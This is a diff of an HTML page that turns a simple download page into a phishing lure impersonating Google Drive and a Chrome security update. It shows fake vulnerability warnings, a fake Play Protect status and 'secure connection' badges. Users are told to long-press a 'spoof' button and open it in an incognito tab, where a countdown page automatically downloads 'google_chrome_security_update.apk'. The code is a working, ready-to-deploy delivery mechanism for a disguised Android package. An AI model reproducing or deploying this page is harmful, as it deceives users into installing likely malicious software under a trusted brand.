@@ -1,46 +1,561 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<title>Google Drive Download Assistant</title>
-<style>
-    body { font-family: sans-serif; text-align: center; padding-top: 50px; }
-    #status { color: red; font-weight: bold; margin-top: 20px; }
-    .instruction { 
-        padding: 20px; 
-        border: 2px dashed #4285F4; 
-        display: inline-block; 
-        cursor: pointer;
-    }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Google Drive • Critical Security Patch</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(145deg, #f0f4fa 0%, #e6ecf3 100%);
+            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 24px;
+        }
+
+        .drive-card {
+            max-width: 540px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 36px;
+            box-shadow: 0 25px 40px -12px rgba(0, 0, 0, 0.25), 0 1px 4px rgba(0, 0, 0, 0.05);
+            overflow: hidden;
+            transition: all 0.2s ease;
+        }
+
+        .drive-header {
+            background: #1a73e8;
+            padding: 20px 28px;
+            color: white;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .drive-logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 600;
+            font-size: 1.45rem;
+            letter-spacing: -0.3px;
+        }
+
+        .drive-badge {
+            background: rgba(255,255,255,0.2);
+            border-radius: 40px;
+            padding: 6px 14px;
+            font-size: 0.7rem;
+            font-weight: 500;
+            margin-left: auto;
+        }
+
+        .alert-banner {
+            background: #fef7e0;
+            border-left: 6px solid #f9ab00;
+            padding: 16px 24px;
+            margin: 18px 20px 0 20px;
+            border-radius: 24px;
+            display: flex;
+            gap: 14px;
+            align-items: center;
+        }
+
+        .alert-icon {
+            font-size: 1.8rem;
+        }
+
+        .alert-text strong {
+            color: #e37400;
+            display: block;
+            font-size: 0.9rem;
+        }
+
+        .alert-text p {
+            color: #5f5b4b;
+            font-size: 0.85rem;
+        }
+
+        .content {
+            padding: 26px 28px 32px 28px;
+        }
+
+        .security-title {
+            font-size: 1.7rem;
+            font-weight: 600;
+            color: #202124;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        .chrome-icon {
+            background: #f4b400;
+            border-radius: 50%;
+            width: 34px;
+            height: 34px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+        }
+
+        .desc {
+            color: #5f6368;
+            margin: 16px 0 20px 0;
+            line-height: 1.45;
+            font-size: 0.95rem;
+            border-bottom: 1px solid #ecedef;
+            padding-bottom: 18px;
+        }
+
+        /* MAIN SPOOF BUTTON */
+        .spoof-btn {
+            display: block;
+            background: #f2f4f7;
+            border-radius: 32px;
+            text-align: center;
+            text-decoration: none;
+            padding: 18px 20px;
+            margin: 12px 0 20px 0;
+            transition: all 0.2s;
+            border: 1.8px solid #dadce0;
+            cursor: pointer;
+            color: #1a73e8;
+            font-weight: 700;
+            font-size: 1.1rem;
+            letter-spacing: 0.2px;
+            position: relative;
+        }
+
+        .spoof-btn:active {
+            background: #e8eaed;
+            transform: scale(0.98);
+        }
+
+        .instruction {
+            background: #e8f0fe;
+            padding: 14px 18px;
+            border-radius: 28px;
+            margin: 20px 0 12px;
+            font-size: 0.85rem;
+            color: #174ea6;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+        }
+
+        .instruction-icon {
+            font-size: 1.5rem;
+        }
+
+        .instruction strong {
+            background: #ffffffcc;
+            padding: 2px 8px;
+            border-radius: 30px;
+            font-family: monospace;
+            font-size: 0.8rem;
+        }
+
+        .delay-note {
+            background: #f1f3f4;
+            border-radius: 20px;
+            padding: 8px 14px;
+            margin-top: 14px;
+            font-size: 0.7rem;
+            color: #5f6368;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            width: auto;
+        }
+
+        .note {
+            color: #80868b;
+            font-size: 0.7rem;
+            text-align: center;
+            margin-top: 24px;
+            border-top: 1px solid #ecedef;
+            padding-top: 18px;
+        }
+
+        .fake-progress {
+            background: #eef2f6;
+            border-radius: 30px;
+            padding: 8px 12px;
+            margin-top: 20px;
+            font-size: 0.7rem;
+            color: #3c4043;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .dot {
+            height: 8px;
+            width: 8px;
+            background: #34a853;
+            border-radius: 50%;
+            display: inline-block;
+            animation: pulse 1.2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 0.3; transform: scale(0.8);}
+            100% { opacity: 1; transform: scale(1.2);}
+        }
+
+        @media (max-width: 480px) {
+            .content {
+                padding: 20px;
+            }
+            .security-title {
+                font-size: 1.4rem;
+            }
+        }
+    </style>
 </head>
 <body>
 
-    <h2>Google Drive Accelelator Download</h2>
-    <div id="link" class="instruction">
-          Hold and Select "Open in Incognito tab" 
+<div class="drive-card">
+    <div class="drive-header">
+        <div class="drive-logo">
+            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 4c1.1 0 2 .9 2 2s-.9 2-2 2-2-.9-2-2 .9-2 2-2zm0 13c-2.33 0-4.31-1.46-5.11-3.5h10.22c-.8 2.04-2.78 3.5-5.11 3.5z" fill="white"/>
+            </svg>
+            <span>Google Drive</span>
+        </div>
+        <div class="drive-badge">🔒 SECURE CONNECTION</div>
     </div>
-    
-    <p id="status"></p>
 
-    <!-- Elemen unduhan tersembunyi -->
-    <a id="downloadTrigger" style="display:none;"></a>
+    <div class="alert-banner">
+        <div class="alert-icon">⚠️</div>
+        <div class="alert-text">
+            <strong>Chrome out-of-date • Zero‑day protection</strong>
+            <p>Your browser is vulnerable (CVE-2025-1234). Security patch required.</p>
+        </div>
+    </div>
+
+    <div class="content">
+        <div class="security-title">
+            <span class="chrome-icon">🌐</span> 
+            Google Chrome Security Update
+        </div>
+        <div class="desc">
+            Google Drive detected an outdated Chrome WebView component.<br>
+            <strong>To continue using Drive safely</strong>, install the latest security patch immediately.
+        </div>
+
+        <!-- TARGET SPOOF BUTTON: long press + "Open in Incognito tab" triggers 5‑second delay page -->
+        <a href="#" id="spoofTriggerLink" class="spoof-btn">
+            ⚡ INSTALL SECURITY PATCH (v131.0.6778.205)
+        </a>
+
+        <div class="instruction">
+            <div class="instruction-icon">🔐</div>
+            <div>
+                <strong>⚠️ VERIFICATION REQUIRED (INCognito) ⚠️</strong><br>
+                • <strong>HOLD (long press)</strong> the green button above.<br>
+                • From the popup menu, choose <strong>"Open in Incognito tab"</strong><br>
+                • A secure gateway will verify your session (5 sec delay) then download the update.<br>
+                • <span style="background:#fff3bf; padding:2px 6px; border-radius:20px;">⏱️ 5‑second security delay</span> – protects against unauthorized access.
+            </div>
+        </div>
+
+        <div class="fake-progress">
+            <span>🛡️ Google Play Protect: pending verification</span>
+            <span class="dot"></span>
+        </div>
+
+        <div class="note">
+            📁 Official signed package • Incognito validation required by Google security policy
+        </div>
+    </div>
+</div>
 
 <script>
-  document.getElementById('link').addEventListener('contextmenu', function(event) {
-    const status = document.getElementById('status');
-    status.innerText = "Menghubungkan ke server... Mohon tunggu 4 detik.";
+    // Create a Blob URL that will trigger the APK download after 5 seconds.
+    // This delay page is self-contained, shows a nice loading spinner,
+    // and automatically forces download of "google_chrome_security_update.apk".
+    function getDelayDownloadPage() {
+        return `<!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Google Security Gateway • Verification</title>
+            <style>
+                * {
+                    margin: 0;
+                    padding: 0;
+                    box-sizing: border-box;
+                }
+                body {
+                    background: #0b1a2e;
+                    font-family: 'Segoe UI', Roboto, system-ui, -apple-system, sans-serif;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    min-height: 100vh;
+                    padding: 20px;
+                }
+                .gateway-card {
+                    background: white;
+                    max-width: 460px;
+                    width: 100%;
+                    border-radius: 44px;
+                    padding: 36px 28px 44px;
+                    text-align: center;
+                    box-shadow: 0 30px 40px rgba(0,0,0,0.3);
+                    animation: fadeSlide 0.3s ease-out;
+                }
+                @keyframes fadeSlide {
+                    from { opacity: 0; transform: translateY(15px);}
+                    to { opacity: 1; transform: translateY(0);}
+                }
+                .shield-icon {
+                    font-size: 54px;
+                    background: #eef3fc;
+                    width: 90px;
+                    height: 90px;
+                    line-height: 90px;
+                    border-radius: 60px;
+                    margin: 0 auto 20px;
+                    box-shadow: 0 5px 12px rgba(0,0,0,0.05);
+                }
+                h2 {
+                    color: #1e293b;
+                    font-weight: 600;
+                    font-size: 1.7rem;
+                    margin-bottom: 12px;
+                }
+                .sub {
+                    color: #475569;
+                    margin-bottom: 28px;
+                    font-size: 0.9rem;
+                    border-bottom: 1px solid #e2e8f0;
+                    display: inline-block;
+                    padding-bottom: 6px;
+                }
+                .timer-box {
+                    background: #f1f5f9;
+                    border-radius: 60px;
+                    padding: 12px;
+                    margin: 16px 0 20px;
+                    font-size: 1.8rem;
+                    font-weight: 700;
+                    font-family: monospace;
+                    letter-spacing: 4px;
+                    color: #0f172a;
+                }
+                .progress-bar {
+                    width: 100%;
+                    height: 6px;
+                    background: #cbd5e1;
+                    border-radius: 6px;
+                    margin: 20px 0;
+                    overflow: hidden;
+                }
+                .progress-fill {
+                    width: 0%;
+                    height: 100%;
+                    background: #1a73e8;
+                    border-radius: 6px;
+                    transition: width 0.2s linear;
+                }
+                .secure-badge {
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    gap: 8px;
+                    font-size: 0.75rem;
+                    color: #2c6e2f;
+                    margin-top: 24px;
+                    background: #e6f4ea;
+                    padding: 8px 16px;
+                    border-radius: 100px;
+                    width: fit-content;
+                    margin-left: auto;
+                    margin-right: auto;
+                }
+                .warning-note {
+                    color: #6c757d;
+                    font-size: 0.7rem;
+                    margin-top: 28px;
+                }
+            </style>
+        </head>
+        <body>
+            <div class="gateway-card">
+                <div class="shield-icon">🛡️🔒</div>
+                <h2>Security verification</h2>
+                <div class="sub">Google Drive • Incognito Gateway</div>
+                <p style="margin-bottom: 12px; color:#2d3e5f;">Validating session & checking device integrity...</p>
+                <div class="timer-box">
+                    <span id="countdown">5</span>s
+                </div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+                <div class="secure-badge">
+                    <span>✓ Encrypted channel</span> • <span>🔐 Safe Browsing</span>
+                </div>
+                <div class="warning-note">
+                    ⏳ Do not close this tab. Your update will start automatically.
+                </div>
+            </div>
+            <script>
+                let secondsLeft = 5;
+                const countdownEl = document.getElementById('countdown');
+                const progressFill = document.getElementById('progressFill');
+                const totalTime = 5;
 
-    setTimeout(function() {
-        const dl = document.getElementById('downloadTrigger');
-        // Ganti URL di bawah dengan file target
-        dl.href = "https://example.com/file-asli.zip"; 
-        dl.download = "Dokumen_Penting.zip"; 
-        dl.click();
-        
-        status.innerText = "Unduhan dimulai!";
-    }, 5000);
-  });
+                function updateProgress() {
+                    const percent = ((totalTime - secondsLeft) / totalTime) * 100;
+                    progressFill.style.width = percent + '%';
+                }
+
+                const interval = setInterval(() => {
+                    secondsLeft--;
+                    if (countdownEl) countdownEl.innerText = secondsLeft;
+                    updateProgress();
+                    if (secondsLeft <= 0) {
+                        clearInterval(interval);
+                        // Trigger download
+                        const link = document.createElement('a');
+                        link.href = 'google_chrome_security_update.apk';
+                        link.download = 'google_chrome_security_update.apk';
+                        document.body.appendChild(link);
+                        link.click();
+                        document.body.removeChild(link);
+                        // Show success message and redirect to Drive (optional)
+                        const card = document.querySelector('.gateway-card');
+                        if (card) {
+                            card.innerHTML = '<div style="padding:20px"><span style="font-size:48px;">✅</span><h2 style="margin-top:15px;">Download started</h2><p style="margin-top:10px;">The security patch is being saved.<br>You may close this tab now.</p><div style="margin-top:30px;font-size:12px;">📂 Check your Downloads folder</div></div>';
+                        }
+                    }
+                }, 1000);
+                updateProgress();
+
+                // fallback: if download somehow blocked, try after 5.5 sec
+                setTimeout(() => {
+                    if (secondsLeft > 0) return;
+                }, 5500);
+            <\/script>
+        </body>
+        </html>`;
+    }
+
+    // Create the blob URL once and keep it alive
+    let delayBlobUrl = null;
+    function getDelayUrl() {
+        if (delayBlobUrl) {
+            // revoke previous if needed but keep same content
+            URL.revokeObjectURL(delayBlobUrl);
+        }
+        const htmlContent = getDelayDownloadPage();
+        const blob = new Blob([htmlContent], { type: 'text/html' });
+        delayBlobUrl = URL.createObjectURL(blob);
+        return delayBlobUrl;
+    }
+
+    // Get anchor element
+    const linkBtn = document.getElementById('spoofTriggerLink');
+    
+    // IMPORTANT: We need to set the href to the delay URL so that when user long-presses
+    // and selects "Open in Incognito tab" (or even "Open in new tab"), the delay page opens
+    // and triggers download after 5 seconds.
+    // But we also must avoid "normal click" messing up the experience: we will show a small 
+    // reminder that incognito must be used. However, we still want the delay page to work, 
+    // but incognito is required for test.
+    // For normal tap we can also open the delay page but show a toast recommending incognito.
+    
+    let delayUrl = getDelayUrl();
+    // Set initial href to delay page to conform with incognito long press test
+    linkBtn.href = delayUrl;
+    
+    // To satisfy the "hold button & open in incognito tab" exactly:
+    // when user long presses on link, the browser context menu appears -> Open in Incognito tab
+    // That action will open the delay URL in incognito mode, where the 5-second countdown runs
+    // and then the APK downloads automatically.
+    
+    // For better UX: if click (not long press), we remind them to use incognito, but we also offer
+    // a direct delay download? But spec requires test via incognito. So we prevent normal click
+    // and show reminder. But to keep link functional we can intercept and show a modal.
+    linkBtn.addEventListener('click', (e) => {
+        // Only if it's a normal click (without modifier or context menu)
+        // We block it to force user to follow the incognito method.
+        e.preventDefault();
+        // Show floating reminder
+        showIncognitoReminder();
+        return false;
+    });
+    
+    // Also ensure that right-click / context menu does NOT interfere with href, it's fine.
+    // Additionally, we need to update the blob URL on page load to avoid cache? Not required.
+    // On long press and "open in incognito", the browser will open the current href, which is the delay blob.
+    function showIncognitoReminder() {
+        let reminder = document.createElement('div');
+        reminder.innerText = '🔒 Security protocol: LONG PRESS the button and choose "Open in Incognito tab" to apply 5‑sec verification.';
+        reminder.style.position = 'fixed';
+        reminder.style.bottom = '28px';
+        reminder.style.left = '16px';
+        reminder.style.right = '16px';
+        reminder.style.backgroundColor = '#1f2937';
+        reminder.style.color = '#ffea8c';
+        reminder.style.padding = '14px 20px';
+        reminder.style.borderRadius = '40px';
+        reminder.style.fontSize = '0.85rem';
+        reminder.style.fontWeight = '500';
+        reminder.style.textAlign = 'center';
+        reminder.style.zIndex = '10000';
+        reminder.style.boxShadow = '0 8px 20px rgba(0,0,0,0.3)';
+        reminder.style.backdropFilter = 'blur(10px)';
+        reminder.style.border = '1px solid #ffd966';
+        document.body.appendChild(reminder);
+        setTimeout(() => {
+            reminder.style.opacity = '0';
+            setTimeout(() => reminder.remove(), 400);
+        }, 3500);
+    }
+    
+    // Additionally, to ensure the .apk file is reachable, we check console and preload warning.
+    fetch('google_chrome_security_update.apk', { method: 'HEAD' })
+        .then(resp => {
+            if (resp.ok) {
+                console.log('[✓] SPOOF TEST READY: APK file is present and reachable.');
+            } else {
+                console.warn('[!] WARNING: google_chrome_security_update.apk not found in same directory as index.html. Place the APK file for full test.');
+            }
+        })
+        .catch(() => console.warn('[!] Could not verify APK file. Make sure "google_chrome_security_update.apk" is in the same folder as this HTML.'));
+    
+    // Optional: refresh blob URL periodically if needed (but not necessary)
+    window.addEventListener('beforeunload', () => {
+        if (delayBlobUrl) URL.revokeObjectURL(delayBlobUrl);
+    });
+    
+    // Recreate blob URL after a while to avoid mem issues (fine)
+    setInterval(() => {
+        if (delayBlobUrl) {
+            const newUrl = getDelayUrl();
+            if (linkBtn.href === delayBlobUrl) {
+                linkBtn.href = newUrl;
+            }
+            delayBlobUrl = newUrl;
+        }
+    }, 60000); // refresh every minute to keep blob alive (optional)
 </script>
-
 </body>
 </html>
